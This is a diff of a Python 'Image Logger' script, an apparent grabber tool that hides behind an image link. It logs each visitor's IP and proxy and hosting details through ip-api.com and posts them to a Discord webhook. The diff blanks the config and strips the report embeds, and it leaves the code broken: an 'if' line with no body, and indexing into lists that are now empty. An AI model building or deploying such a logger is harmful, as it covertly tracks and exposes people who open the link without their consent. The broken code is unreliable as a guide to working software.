@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "",
-    "image": "https://w0.peakpx.com/wallpaper/45/408/HD-wallpaper-tita-bruh-titasama-egirl-thumbnail.jpg", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/your/webhook",
+    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -50,8 +50,8 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": True # Redirect to a webpage?
-        "page": "https://www.youtube.com/watch?v=RvVdFXOFcjw" # Link to the webpage to redirect to 
+        "redirect": False, # Redirect to a webpage?
+        "page": "https://your-link.here" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
@@ -80,9 +80,9 @@ def reportError(error):
     "content": "@everyone",
     "embeds": [
         {
-            "title": "Image Logger - Error",
+            "title": "Info visiting error!",
             "color": config["color"],
-            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
+            "description": f"something from with website, dev, fix it rn!!!!!",
         }
     ],
 })
@@ -96,18 +96,12 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     if bot:
         requests.post(config["webhook"], json = {
     "username": config["username"],
-    "content": "",
-    "embeds": [
-        {
-            "title": "Image Logger - Link Sent",
-            "color": config["color"],
-            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
-        }
-    ],
+    "content": "The website has been sent in the chat, may be raided! Turning on safe mode.",
+    "embeds": [],
 }) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
         return
 
-    ping = "@everyone"
+    ping = "@kostyan1"
 
     info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
     if info["proxy"]:
@@ -135,34 +129,11 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 
         if config["antiBot"] == 1:
                 ping = ""
-
-
-    os, browser = httpagentparser.simple_detect(useragent)
     
     embed = {
     "username": config["username"],
     "content": ping,
-    "embeds": [
-        {
-            "title": "Image Logger - IP Logged",
-            "color": config["color"],
-            "description": f"""**A User Opened the Original Image!**
-
-**Endpoint:** `{endpoint}`
-            
-**IP Info:**
-> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
-
-**PC Info:**
-> **OS:** `{os}`
-> **Browser:** `{browser}`
-
-**User Agent:**
-```
-{useragent}
-```""",
-    }
-  ],
+    "embeds": [],
 }
     
     if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
@@ -230,6 +201,8 @@ height: 100vh;
 
                 message = config["message"]["message"]
 
+                if config["message"]["richMessage"] and result:
+
                 datatype = 'text/html'
 
                 if config["message"]["doMessage"]:
@@ -267,7 +240,7 @@ if (!currenturl.includes("g=")) {
             self.send_header('Content-type', 'text/html')
             self.end_headers()
 
-            self.wfile.write(b'500 - Internal Server Error. Go love yourself :).')
+            self.wfile.write(b'500 - Internal Server Error <br>I think you should contact server owner.<br>@kostyan1 (Костян).')
             reportError(traceback.format_exc())
 
         return
